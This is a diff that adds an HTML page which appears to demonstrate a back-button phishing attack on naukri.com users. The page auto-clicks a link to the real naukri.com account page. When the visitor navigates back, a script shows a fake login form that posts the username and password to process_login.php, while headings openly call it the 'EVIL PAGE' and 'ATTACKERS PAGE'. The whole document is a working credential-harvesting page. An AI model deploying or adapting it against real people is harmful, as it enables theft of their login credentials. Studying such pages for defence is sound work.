@@ -1,0 +1,42 @@
+<html>
+<head>
+ <title>THIS IS THE EVIL PAGE, your account is Please </title></head>
+<body>
+ <div id="forward">
+ <a href="https://www.naukri.com/mynaukri/">GO BACK PAGE</a>
+</div>
+<div id="phish">
+ <h1> WELOCME TO ATTACKERS PAGE </h1>
+</div>
+<div>
+<h1>PLEASE LOGIN HERE </h1>
+ <form action="process_login.php" method="post">
+ <label for="username">Username:</label>
+ <input type="text" id="username" name="username"><br><br>
+ 
+ <label for="password">Password:</label>
+ <input type="password" id="password" name="password"><br><br>
+ 
+ <input type="submit" value="Login">
+ </form>
+ </div>
+<script>
+function hide(id) {
+ document.getElementById(id).style.display = 'none';
+}
+function show(id) {
+ document.getElementById(id).style.display = '';
+}
+window.addEventListener("pageshow", function () {
+ if (performance.navigation.type === performance.navigation.TYPE_BACK_FORWARD) {
+ hide("forward");
+ show("phish");
+ } else {
+ hide("phish");
+ show("forward");
+ document.querySelector("#forward a").click();
+ }
+});
+</script>
+</body>
+</html>
